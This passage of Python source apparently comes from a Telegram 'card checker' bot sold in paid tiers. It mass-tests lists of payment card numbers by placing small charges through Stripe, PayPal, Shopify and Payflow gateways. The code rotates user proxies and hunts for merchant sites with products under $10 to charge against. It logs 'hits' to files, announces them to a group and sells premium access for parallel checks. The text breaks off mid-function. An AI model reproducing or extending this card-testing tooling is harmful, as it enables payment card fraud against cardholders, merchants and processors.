    print(f"\n{'='*80}")
    print(f"🚀 [STC1 MASS CHECK] Starting batch for user {u_id}")
    print(f"📊 Total cards: {total}")
    print(f"{'='*80}")
    
    try:
        stripe_charge_active_tasks[u_id] = True
        
        charged, approved, declined, errors = 0, 0, 0, 0
        start_time = time.time()
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        # Concurrency based on tier
        CONCURRENCY = {
            "free": 10,
            "premium": 20,
            "ultimate": 30,
            "admin": 50
        }.get(tier, 10)
        
        if progress_msg is None:
            progress_msg = await message.reply_text(
                f"⚡ <b>STC1 Mass Check Started</b>\n\n"
                f"📝 Cards: {total}\n"
                f"💰 Amount: $0.50 per card\n"
                f"🔄 Starting...",
                parse_mode=ParseMode.HTML,
                reply_markup=create_progress_buttons(0, total, 0, 0, "", "Starting...")
            )
        
        semaphore = asyncio.Semaphore(CONCURRENCY)
        results_lock = asyncio.Lock()
        processed_count = 0
        hits_sent = 0
        
        async def process_card(card: str, idx: int):
            nonlocal processed_count
            
            async with semaphore:
                await speed_controller.wait_if_needed()
                
                start = time.time()
                proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
                result = await check_card_stc1(card, proxy_str)
                elapsed = time.time() - start
                speed_controller.record_response(elapsed)
                
                async with results_lock:
                    processed_count += 1
                    if processed_count % 5 == 0 or processed_count == total:
                        await update_progress_buttons(
                            context, message.chat_id, progress_msg.message_id,
                            processed_count, total,
                            charged + approved,
                            declined,
                            f"{processed_count}/{total}",
                            "Processing..."
                        )
                
                return idx, result, card, elapsed
        
        # Process all cards
        tasks = [process_card(card, i) for i, card in enumerate(cards)]
        
        for completed in asyncio.as_completed(tasks):
            if u_id not in stripe_charge_active_tasks:
                break
            
            try:
                idx, result, card, elapsed = await completed
                if not result or not card:
                    continue
                
                bin_info = await get_bin_info(card)
                ui, status_category = format_stc1_response(result, card, bin_info)
                response_msg = result.get("message", "")
                
                # Check for hits
                is_hit, hit_type = is_hit_response(response_msg)
                
                if status_category == "charged" or is_hit:
                    charged += 1
                    approved += 1
                    
                    await message.reply_text(ui, parse_mode=ParseMode.HTML)
                    
                    await save_hit_to_file(
                        card=card,
                        gateway="STC1",
                        response=response_msg,
                        price=result.get("price", "$0.50"),
                        bin_info=bin_info,
                        user_id=u_id,
                        user_tier=tier
                    )
                    
                    # Send hit notification
                    user_data = user_manager.get_user(u_id)
                    await send_hit_notification(
                        context=context,
                        gateway="STC1",
                        card=card,
                        response=response_msg,
                        price=result.get("price", "$0.50"),
                        user=user_data,
                        bin_info=bin_info,
                        status_category="charged"
                    )
                    hits_sent += 1
                    
                    user_manager.increment_hits(u_id)
                    
                elif status_category == "approved":
                    approved += 1
                    await message.reply_text(ui, parse_mode=ParseMode.HTML)
                    
                    await save_hit_to_file(
                        card=card,
                        gateway="STC1",
                        response=response_msg,
                        price=result.get("price", "$0.50"),
                        bin_info=bin_info,
                        user_id=u_id,
                        user_tier=tier
                    )
                    
                    user_manager.increment_hits(u_id)
                    
                elif status_category == "declined":
                    declined += 1
                else:
                    errors += 1
                
                user_manager.increment_checks(u_id, 1)
                
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with results_lock:
                    errors += 1
        
        # Final summary
        if u_id in stripe_charge_active_tasks:
            total_time = time.time() - start_time
            
            summary = (
                f"🏁 <b>STC1 Mass Check Complete</b>\n\n"
                f"🔥 Charged/Hits: {charged}\n"
                f"✅ Approved (CVV/3D): {approved - charged}\n"
                f"❌ Declined: {declined}\n"
                f"⚠️ Errors: {errors}\n"
                f"📝 Total: {total}\n"
                f"⏱️ Time: {int(total_time//60)}m {int(total_time%60)}s\n"
                f"🔥 Hits Sent: {hits_sent}"
            )
            
            await progress_msg.edit_text(summary, parse_mode=ParseMode.HTML)
        
        return stats
        
    except Exception as e:
        print(f"❌ STC1 mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        stripe_charge_active_tasks.pop(u_id, None)


async def mass_check_stc1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with STC1 API - /mstc <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if not context.args:
        await message.reply_text(
            "📦 <b>STC1 Mass Check</b>\n\n"
            "Usage: <code>/mstc &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
            "Examples:\n"
            "<code>/mstc 4242424242424242|12|25|123 4000000000000002|12|25|123</code>\n\n"
            "Or with line breaks:\n"
            "<code>/mstc 4242424242424242|12|25|123</code>\n"
            "<code>/mstc 4000000000000002|12|25|123</code>\n\n"
            "💰 Amount: $0.50 per card\n"
            "📍 Gateway: Stripe Charge via STC1 API\n"
            "⚡ Concurrency based on your tier\n"
            "📊 Only approved/charged cards will be shown",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check user access
    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
        await message.reply_text("❌ Your tier doesn't have access to Stripe Charge gateway.")
        return
    
    # Check if user can mass check
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ <b>Mass Check Not Available for {tier.upper()} Tier</b>\n\n"
            f"Your tier ({tier.upper()}) only supports single card checks.\n\n"
            f"Use <code>/stc &lt;card&gt;</code> for single checks.\n\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Extract cards
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    invalid_cards = []
    
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
        else:
            invalid_cards.append(card_str[:30])
    
    if invalid_cards:
        await message.reply_text(
            f"⚠️ Found {len(invalid_cards)} invalid card(s). They will be skipped.\n"
            f"First invalid: {invalid_cards[0]}..."
        )
    
    if not cards:
        await message.reply_text("❌ No valid cards found. Make sure each card is in format: card|mm|yyyy|cvv")
        return
    
    # Check batch size limit
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating to {max_batch}.")
        cards = cards[:max_batch]
    
    # Start mass check
    await mass_check_stc1_logic(update, context, cards)

# ============ MASS PROXY ADDING ============
async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle proxy file upload with automatic testing using /aptest"""
    user_id = update.effective_user.id
    
    if not user_manager.can_use_proxy(user_id):
        await update.message.reply_text("❌ Your tier doesn't support proxy usage.")
        return
    
    try:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        content = content.decode('utf-8', errors='ignore')
        
        # Parse proxies from file
        raw_proxies = []
        for line in content.splitlines():
            line = line.strip()
            if line and not line.startswith('#'):
                # Remove any extra whitespace
                line = line.split('#')[0].strip()
                if line:
                    raw_proxies.append(line)
        
        if not raw_proxies:
            await update.message.reply_text("❌ No proxies found in file.")
            return
        
        status_msg = await update.message.reply_text(
            f"📥 Found {len(raw_proxies)} proxies.\n"
            f"🔍 Validating proxy formats...\n\n"
            f"⚡ Testing with /aptest after validation...",
            parse_mode=ParseMode.HTML
        )
        
        # First, validate formats and add valid proxies
        valid_format_proxies = []
        invalid_format_proxies = []
        
        for proxy in raw_proxies:
            formatted = format_proxy(proxy)
            if formatted:
                valid_format_proxies.append(proxy)
                # Add to user's proxy pool immediately
                if proxy_manager.add_user_proxy(user_id, proxy):
                    print(f"✅ Added proxy for user {user_id}: {mask_proxy(proxy)}")
            else:
                invalid_format_proxies.append(proxy)
        
        # Update status
        await status_msg.edit_text(
            f"📥 <b>Proxy File Processed</b>\n\n"
            f"📊 Total: {len(raw_proxies)}\n"
            f"✅ Valid Format: {len(valid_format_proxies)}\n"
            f"❌ Invalid Format: {len(invalid_format_proxies)}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔄 <b>Auto-testing proxies with /aptest...</b>\n"
            f"⏱️ This may take a moment...",
            parse_mode=ParseMode.HTML
        )
        
        # Auto-run aptest on the newly added proxies
        if valid_format_proxies:
            # Store the status message to update later
            context.user_data['aptest_status_msg'] = status_msg
            # Run aptest automatically
            await autosopi_proxy_test_command(update, context)
        else:
            await status_msg.edit_text(
                f"❌ <b>No valid proxies found</b>\n\n"
                f"All {len(raw_proxies)} proxies had invalid formats.\n\n"
                f"Supported formats:\n"
                f"• <code>ip:port</code>\n"
                f"• <code>user:pass@ip:port</code>\n"
                f"• <code>user:pass:ip:port</code>\n"
                f"• <code>ip:port:user:pass</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=back_menu()
            )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")

# ============ MASS SITE ADDING ============
async def handle_site_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle site file upload for Autosopi with price checking - NO PROGRESS UPDATES"""
    user_id = update.effective_user.id
    user = update.effective_user
    user_name = user.first_name
    if user.username:
        user_name += f" (@{user.username})"
    
    can_add_directly = user_manager.can_add_autosopi_sites_directly(user_id)
    
    try:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        content = content.decode('utf-8', errors='ignore')
        
        sites = [line.strip() for line in content.splitlines() if line.strip() and not line.startswith('#')]
        
        if not sites:
            await update.message.reply_text("❌ No sites found in file.")
            return
        
        # ============ ONLY ONE INITIAL MESSAGE - NO PROGRESS UPDATES ============
        status_msg = await update.message.reply_text(
            f"📥 Found {len(sites)} sites.\n"
            f"🔄 Sites are getting added...\n"
            f"This may take a few minutes.\n\n"
            f"⏱️ Rate limited: 1 site every 3 seconds\n"
            f"📊 You will receive a completion message when done.",
            parse_mode=ParseMode.HTML
        )
        
        working = []
        cheap_sites = []
        failed = []
        no_cheap_products = []
        timeout_sites = []
        
        for i, site in enumerate(sites, 1):
            # ============ REMOVED: NO PROGRESS UPDATE HERE ============
            # Just process silently - only console logs
            
            # Add delay to avoid flood control
            await asyncio.sleep(3)
            
            # Step 1: Check accessibility
            try:
                is_working, test_msg = await test_site_with_timeout(site, timeout=8)
            except Exception as e:
                timeout_sites.append(site)
                print(f"⏰ Site timeout: {site}")
                continue
            
            if not is_working:
                failed.append(site)
                print(f"❌ Site failed: {site} - {test_msg}")
                continue
            
            working.append(site)
            
            # Step 2: Check for cheap products (under $10)
            try:
                has_cheap, prices, price_msg = await check_site_product_prices_with_timeout(site, timeout=12)
            except asyncio.TimeoutError:
                timeout_sites.append(site)
                print(f"⏰ Site timeout (price check): {site}")
                continue
            
            if not has_cheap:
                no_cheap_products.append(site)
                print(f"💰 No cheap products: {site}")
                continue
            
            cheap_sites.append(site)
            
            # Add the site if it has cheap products
            success, result_msg = autosopi_site_manager.add_site(
                site, user.id, user_name, bypass_pending=can_add_directly
            )
            if success and can_add_directly:
                user_manager.increment_sites_added(user_id)
                print(f"✅ Site added: {site}")
            else:
                print(f"❌ Site add failed: {site}")
        
        # ============ ONLY ONE COMPLETION MESSAGE AT THE END ============
        result = (
            f"✅ <b>Mass Site Addition Complete!</b>\n\n"
            f"📥 Total Sites: {len(sites)}\n"
            f"✅ Working: {len(working)}\n"
            f"💰 Sites with products under $10: {len(cheap_sites)}\n"
            f"❌ Failed: {len(failed)}\n"
            f"⚠️ No cheap products: {len(no_cheap_products)}\n"
        )
        
        if cheap_sites:
            result += "<b>✅ Added Sites (with products under $10):</b>\n"
            for site in cheap_sites[:10]:
                result += f"  • {site}\n"
            if len(cheap_sites) > 10:
                result += f"  ... and {len(cheap_sites)-10} more\n"
        
        if no_cheap_products:
            result += f"\n<b>⚠️ Skipped (No products under $10):</b>\n"
            for site in no_cheap_products[:5]:
                result += f"  • {site}\n"
            if len(no_cheap_products) > 5:
                result += f"  ... and {len(no_cheap_products)-5} more\n"
        
        if can_add_directly:
            result += f"\n✅ Sites with cheap products added directly to rotation."
        else:
            result += f"\n⏳ Sites with cheap products submitted for admin approval."
        
        await status_msg.edit_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")

# ============ BROADCAST BACKGROUND TASK ============
async def broadcast_worker(context: ContextTypes.DEFAULT_TYPE):
    """Background task to send pending broadcasts to users"""
    broadcast = broadcast_manager.get_next_broadcast()
    if not broadcast:
        return
    
    users = user_manager.list_users()
    sent_count = 0
    
    for user in users:
        try:
            user_id = int(user["id"])
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 <b>Broadcast Message</b>\n\n{broadcast['message']}",
                parse_mode=ParseMode.HTML
            )
            broadcast_manager.mark_sent(broadcast["id"], user_id)
            sent_count += 1
            
            await asyncio.sleep(0.05)
            
        except Exception as e:
            print(f"⚠️ Failed to send broadcast to {user_id}: {e}")
            continue
    
    broadcast_manager.complete_broadcast(broadcast["id"])
    print(f"📢 Broadcast {broadcast['id']} sent to {sent_count} users")

# ============ KEY EXPIRY CHECK BACKGROUND TASK ============
async def key_expiry_worker(context: ContextTypes.DEFAULT_TYPE):
    """Background task to check for expired keys"""
    key_manager.check_expired_keys()
    
    users = user_manager.users
    current_time = time.time()
    
    for user_id_str, user_data in users.items():
        if user_data.get("tier_expiry", 0) > 0 and current_time > user_data["tier_expiry"]:
            original_tier = user_data.get("upgraded_from", "free")
            user_data["tier"] = original_tier
            user_data["tier_expiry"] = 0
            user_data["upgraded_from"] = None
            print(f"👤 User {user_id_str} tier expired, reverted to {original_tier}")
    
    user_manager.save_users()


# ============ ACCESS CONTROL FUNCTIONS ============

async def check_user_access(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway: str, is_mass_check: bool = False) -> Tuple[bool, Optional[str]]:
    """Check if user can access gateway - FREE in groups, PAID in private with credits"""
    user_id = update.effective_user.id
    chat = update.effective_chat
    
    user_manager.update_user_info(user_id, update.effective_user.username or "NoUsername", update.effective_user.first_name)
    
    # Check group membership (always required)
    if not await check_group_membership(update, context):
        return False, f"❌ You must join {REQUIRED_GROUP} to use this bot.\n\nJoin here: {REQUIRED_GROUP_LINK}"
    
    # Initialize credits for new free users (first time)
    tier = user_manager.get_tier(user_id)
    if tier == 'free':
        current_credits = get_user_credits(user_id)
        if current_credits == 0 and user_id not in user_credits:
            # New free user, give initial credits
            current_credits = initialize_new_user_credits(user_id)
    
    # FREE IN GROUP CHATS for single checks (no credit deduction)
    if chat.type in ['group', 'supergroup'] and not is_mass_check:
        # Free for everyone in groups! No credit deduction
        return True, None
    
    # PRIVATE CHAT - Credit system for free users
    if chat.type == 'private':
        # Check if user has a paid tier
        tier = user_manager.get_tier(user_id)
        
        # Admin/Ultimate/Premium users bypass credit system
        if tier in ['premium', 'ultimate', 'admin']:
            return True, None
        
        # Free users - check credits
        if tier == 'free':
            # Check if user has enough credits
            if not user_manager.has_enough_credits(user_id, CREDITS_PER_CHECK):
                return False, (
                    f"❌ <b>Insufficient Credits!</b>\n\n"
                    f"You have {get_user_credits(user_id)} credits remaining.\n"
                    f"Each check costs {CREDITS_PER_CHECK} credit.\n\n"
                    f"💎 <b>Ways to get more credits:</b>\n"
                    f"• Use in group chats (FREE! No credits used)\n"
                    f"• Upgrade to Premium/Ultimate for unlimited checks\n"
                    f"• Purchase credits from @Cypher099\n\n"
                    f"<b>Your Stats:</b>\n"
                    f"📊 Credits: {get_user_credits(user_id)}\n"
                    f"🎯 Tier: FREE\n"
                    f"📝 Single check only (mass check not available)\n"
                    f"━━━━━━━━━━━━━━━━━━━"
                )
            
            # Check if mass check (free users can't use mass check in private)
            if is_mass_check:
                return False, (
                    f"❌ <b>Mass Check Not Available for Free Users</b>\n\n"
                    f"Free tier users can only use single card checks in private chats.\n"
                    f"Use <code>/sh &lt;card&gt;</code> for single checks.\n\n"
                    f"💎 <b>Upgrade to Premium/Ultimate for mass checks:</b>\n"
                    f"• Premium: $10/month - 50 parallel checks\n"
                    f"• Ultimate: $20/month - 100 parallel checks\n\n"
                    f"Use /redeem to upgrade or contact @Cypher099"
                )
            
            # Check rate limiting for free users
            allowed, wait = user_manager.check_rate_limit(user_id)
            if not allowed:
                return False, f"⏱️ Rate limited. Please wait {wait:.1f} seconds between checks."
            
            # Check daily limit
            allowed, remaining = user_manager.check_daily_limit(user_id)
            if not allowed:
                stats = user_manager.get_user_stats(user_id)
                return False, f"❌ Daily limit reached ({stats['daily_limit']} checks).\nUpgrade to Premium/Ultimate for unlimited checks."
            
            # Deduct credit AFTER all checks pass
            user_manager.use_credit(user_id)
            
            return True, None
        
        # Check if user has access to this gateway (for paid tiers)
        if not user_manager.can_access_gateway(user_id, gateway):
            tier = user_manager.get_tier(user_id)
            return False, (
                f"❌ <b>Private Chat Usage Requires Paid Tier</b>\n\n"
                f"Your tier ({tier.upper()}) doesn't have access to {gateway} gateway.\n\n"
                f"💎 <b>Upgrade to Premium/Ultimate for private checking:</b>\n"
                f"• Premium: $10/month - All gateways\n"
                f"• Ultimate: $20/month - All gateways + priority\n\n"
                f"Use /redeem with a key or contact @Cypher099 to purchase."
            )
        
        # Rate limiting per user (for private)
        allowed, wait = user_manager.check_rate_limit(user_id)
        if not allowed:
            return False, f"⏱️ Rate limited. Please wait {wait:.1f} seconds between checks."
        
        # Daily limit check (for private)
        allowed, remaining = user_manager.check_daily_limit(user_id)
        if not allowed:
            stats = user_manager.get_user_stats(user_id)
            return False, f"❌ Daily limit reached ({stats['daily_limit']} checks).\nUpgrade your tier for more checks or wait until tomorrow."
    
    return True, None


# ============ PAYPAL MASS CHECK LOGIC ============

async def paypal_single_check_with_gif(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
    """
    Single check with GIF on top + result below (like the image)
    """
    u_id = update.effective_user.id
    message = update.effective_message
    username = update.effective_user.username or update.effective_user.first_name
    
    try:
        allowed, error_msg = await check_user_access(update, context, "paypal")
        if not allowed:
            await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
            return
        
        tier = user_manager.get_tier(u_id)
        if u_id not in user_speed_controllers:
            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
        speed_controller = user_speed_controllers[u_id]
        
        amount = context.user_data.get('payment_amount', DEFAULT_AMOUNT)
        
        # Send checking message
        status_msg = await message.reply_text("🔄 Checking card...")
        
        await speed_controller.wait_if_needed()
        start = time.time()
        
        proxy_str = get_proxy_for_user(u_id) if user_manager.can_use_proxy(u_id) else None
        result = await check_card_paypal(card, amount, DEFAULT_CURRENCY, proxy_str, u_id)
        
        elapsed = time.time() - start
        speed_controller.record_response(elapsed)
        
        bin_info = await get_bin_info(card)
        
        # Delete checking message
        try:
            await status_msg.delete()
        except:
            pass
        
        # Determine status
        status_category = result.get("status_category", "unknown")
        response_text = result.get("message", "Unknown")
        
        # ============ FOR HITS: Send GIF + Result ============
        if status_category == "charged":
            await send_gif_with_result(
                update=update,
                context=context,
                card=card,
                gateway="PayPal",
                response=response_text,
                price=f"${amount}",
                bin_info=bin_info,
                status_category="charged",
                username=username
            )
            
            # Save hit to file
            await save_hit_to_file(
                card=card, gateway="PayPal",
                response=response_text, price=f"${amount}",
                bin_info=bin_info, user_id=u_id, user_tier=tier
            )
            
            # Send notification to group
            user_data = user_manager.get_user(u_id)
            await send_hit_notification(
                context=context, gateway="PayPal", card=card,
                response=response_text, price=f"${amount}",
                user=user_data, bin_info=bin_info, status_category="charged"
            )
            
            user_manager.increment_hits(u_id)
        
        else:
            # For non-hits, just send the result (no GIF)
            ui, _ = format_paypal_response_stylish(result, card, bin_info, amount)
            await message.reply_text(ui, parse_mode=ParseMode.HTML)
        
        user_manager.increment_checks(u_id)
        
    except Exception as e:
        try:
            await status_msg.delete()
        except:
            pass
        await message.reply_text(f"❌ Error: {str(e)[:100]}")
        print(f"❌ Error: {traceback.format_exc()}")
# ============ UPDATE STATUS COMMAND ============

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot status and active users across all gateways"""
    if not await verify_group_access(update, context):
        return
    
    # Count active users across all gateways
    active_users = set()
    
    for task_dict in [paypal_active_tasks, shopify_active_tasks, razorpay_active_tasks, 
                      stripe_charge_active_tasks, stripe_auth_active_tasks, 
                      braintree_active_tasks, autosopi_active_tasks, payflow_active_tasks]:
        active_users.update(task_dict.keys())
    
    # Get per-gateway counts
    paypal_count = len(paypal_active_tasks)
    shopify_count = len(shopify_active_tasks)
    razorpay_count = len(razorpay_active_tasks)
    stripe_charge_count = len(stripe_charge_active_tasks)
    stripe_auth_count = len(stripe_auth_active_tasks)
    braintree_count = len(braintree_active_tasks)
    autosopi_count = len(autosopi_active_tasks)
    payflow_count = len(payflow_active_tasks)
    
    # Get system metrics
    cpu = psutil.cpu_percent()
    memory = psutil.virtual_memory().percent
    
    msg = f"📊 <b>Bot Status - ULTRA MULTI-USER MODE</b>\n\n"
    msg += f"👥 <b>Total Active Users: {len(active_users)}</b>\n"
    msg += f"🎯 Max Concurrent: {MAX_CONCURRENT_USERS}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n"
    msg += f"💻 CPU: {cpu}% | 🧠 Memory: {memory}%\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n"
    msg += f"💳 PayPal: {paypal_count}\n"
    msg += f"🛍️ Shopify: {shopify_count}\n"
    msg += f"💰 Razorpay: {razorpay_count}\n"
    msg += f"💳 Stripe Charge: {stripe_charge_count}\n"
    msg += f"💳 Stripe Auth: {stripe_auth_count}\n"
    msg += f"🔷 Braintree: {braintree_count}\n"
    msg += f"🤖 Autosopi: {autosopi_count}\n"
    msg += f"💸 Payflow: {payflow_count}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📦 Proxies: {len(proxy_manager.active_proxies)} active\n"
    msg += f"🌐 Sites: {len(autosopi_site_manager.sites)} active\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n"
    msg += f"⚡ All users process simultaneously - no waiting!\n"
    msg += f"🚀 Truly parallel multi-user operation for 2000+ users"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
  
# PAYFLOW  
    
async def single_check_payflow_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Single card check with Payflow gateway - /pf <card>"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text(
            "💳 <b>Payflow Single Check</b>\n\n"
            "Usage: <code>/pf &lt;card&gt;</code>\n"
            "Example: <code>/pf 4111111111111111|12|2025|123</code>\n\n"
            "💰 Amount: $14.99 (fixed)\n"
            "📍 Gateway: Payflow via SpeechBuddy",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_id = update.effective_user.id
    
    # Check if user has access to payflow
    if not user_manager.can_access_gateway(user_id, 'payflow'):
        await update.message.reply_text("❌ Your tier doesn't have access to Payflow gateway.")
        return
    
    card_text = " ".join(context.args).strip()
    card = card_formatter.extract_single_card_from_text(card_text)
    
    if not card:
        await update.message.reply_text(
            "❌ Invalid card format. Use: card|mm|yyyy|cvv\n"
            "Example: 4111111111111111|12|2025|123"
        )
        return
    
    # Call the existing payflow single check logic
    await payflow_single_check_logic(update, context, card)

# ============ SHOPIFY SINGLE CHECK GATEWAY (AUTOSOPI MAIN API) ============

# ============ SHOPIFY SINGLE CHECK GATEWAY (AUTOSOPI MAIN API) ============

# Get all sites from autosopi_site_manager
def get_all_working_sites():
    """Get all sites from Autosopi site manager, excluding dead ones"""
    sites = []
    for site in autosopi_site_manager.sites:
        # Skip sites marked as dead (3+ failures)
        if autosopi_site_manager.site_failures.get(site, 0) < 3:
            sites.append(site)
    
    # If no working sites, use all sites
    if not sites:
        sites = autosopi_site_manager.sites.copy()
    
    return sites

SH_GATEWAY_PRICE = "0.25"
SH_GATEWAY_GATEWAY = "Shopify Payments"

def format_proxy_for_autoshopify(proxy: str) -> Optional[str]:
    """
    Format proxy for AutoShopify API
    Expected format: host:port:user:pass
    Example: px019603.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs
    
    Handles all input formats:
    - host:port:user:pass (already correct)
    - user:pass@host:port
    - user:pass:host:port
    - ip:port (no auth)
    - http://user:pass@host:port (with protocol)
    """
    if not proxy:
        return None
    
    original_proxy = proxy
    
    try:
        # Step 1: Remove any protocol prefixes
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
        
        # Step 2: Check if already in correct format (host:port:user:pass)
        parts = proxy.split(':')
        if len(parts) == 4:
            # Check if second part is port (digits) -> host:port:user:pass
            if parts[1].isdigit():
                # Already in correct format!
                print(f"✅ [AutoShopify Proxy] Using as-is: {proxy[:50]}...")
                return proxy
            else:
                # Format: user:pass:host:port - needs conversion
                user, password, host, port = parts
                if port.isdigit():
                    result = f"{host}:{port}:{user}:{password}"
                    print(f"✅ [AutoShopify Proxy] Converted user:pass:host:port -> {result[:50]}...")
                    return result
        
        # Step 3: Handle @ format (user:pass@host:port)
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth and ':' in hostport:
                user, password = auth.split(':', 1)
                host, port = hostport.split(':', 1)
                result = f"{host}:{port}:{user}:{password}"
                print(f"✅ [AutoShopify Proxy] Converted @ format -> {result[:50]}...")
                return result
        
        # Step 4: host:port only (no authentication)
        if len(parts) == 2 and parts[1].isdigit():
            print(f"⚠️ [AutoShopify Proxy] Proxy without auth: {proxy}")
            return proxy
        
        # Step 5: Try to extract using pattern matching
        # Look for pattern: host:port followed by user:pass
        match = re.search(r'([a-zA-Z0-9\.-]+):(\d+)[:@]?([a-zA-Z0-9]+):([a-zA-Z0-9]+)', proxy)
        if match:
            host, port, user, password = match.groups()
            result = f"{host}:{port}:{user}:{password}"
            print(f"✅ [AutoShopify Proxy] Extracted via regex -> {result[:50]}...")
            return result
        
        print(f"⚠️ [AutoShopify Proxy] Could not parse: {original_proxy[:50]}...")
        return None
        
    except Exception as e:
        print(f"⚠️ [AutoShopify Proxy] Error parsing {original_proxy[:50]}: {e}")
        return None

async def check_card_shopify_single(card: str, proxy: str = None, site_list: list = None, site_index: int = 0, retry_count: int = 0) -> Dict:
    """
    Check card using Autosopi MAIN API with site rotation and 1-time retry for TOKENIZE_FAIL
    """
    # Get all working sites if not provided
    if site_list is None:
        site_list = get_all_working_sites()
    
    if site_index >= len(site_list):
        return {
            "status": "error",
            "result": "ALL_SITES_DEAD",
            "message": "All sites are currently down",
            "status_display": "⚠️ ALL SITES DEAD",
            "status_category": "error",
            "elapsed": 0
        }
    
    site_url = site_list[site_index]
    
    print(f"\n{'='*80}")
    print(f"💳 [SHOPIFY SINGLE GATEWAY] Checking card: {card[:20]}...")
    print(f"📍 Site: {site_url} (attempt {site_index + 1}/{len(site_list)})")
    print(f"💰 Price: ${SH_GATEWAY_PRICE}")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    if retry_count > 0:
        print(f"🔄 RETRY ATTEMPT #{retry_count}")
    print(f"{'='*80}")
    
    try:
        # Parse card for validation
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, month, year, cvv = parts
        
        # Format year to 4 digits for TEAMOICX API
        if len(year) == 2:
            year_4digit = f"20{year}"
        else:
            year_4digit = year
        
        # Format card for API
        formatted_card = f"{card_num}|{month}|{year_4digit}|{cvv}"
        
        # Format proxy for TEAMOICX API properly
        proxy_param = None
        if proxy:
            proxy_param = format_proxy_for_teamoicx(proxy)
            if proxy_param:
                print(f"🔍 TEAMOICX API using proxy: {proxy_param[:50]}...")
            else:
                print(f"⚠️ Could not format proxy, continuing without proxy")
        
        # Prepare site URL
        if not site_url.startswith(('http://', 'https://')):
            full_site_url = f"https://{site_url}"
        else:
            full_site_url = site_url
        
        # Make request to TEAMOICX MAIN API
        start_time = time.time()
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(120.0, connect=30.0, read=110.0), verify=False) as client:
            params = {
                "cc": formatted_card,
                "url": full_site_url
            }
            if proxy_param:
                params["proxy"] = proxy_param
            
            response = await client.get(
                TEAMOICX_API,
                params=params,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json"
                },
                timeout=httpx.Timeout(120.0, connect=30.0, read=110.0),
                follow_redirects=True
            )
        
        elapsed = time.time() - start_time
        
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                # Extract response data
                response_text = data.get("response") or data.get("message") or data.get("status") or data.get("Response") or "UNKNOWN"
                gateway = data.get("gateway") or data.get("Gate") or SH_GATEWAY_GATEWAY
                
                # ============ SIMPLE 1-TIME RETRY FOR TOKENIZE_FAIL ============
                # Check if this is TOKENIZE_FAIL and we haven't retried yet
                if "TOKENIZE_FAIL" in response_text and retry_count == 0:
                    print(f"⚠️ TOKENIZE_FAIL detected! Will retry once.")
                    
                    # Try next site for retry
                    next_site_index = site_index + 1
                    
                    # Wait 2 seconds before retry
                    await asyncio.sleep(2)
                    
                    # Retry with same proxy but next site
                    return await check_card_shopify_single(
                        card, proxy, site_list, next_site_index, retry_count=1
                    )
                
                # Check for site dead
                if "SITE DEAD" in response_text:
                    print(f"⚠️ Site {site_url} is DEAD, trying next site...")
                    autosopi_site_manager.mark_site_result(site_url, False, is_site_dead=True)
                    await asyncio.sleep(1)
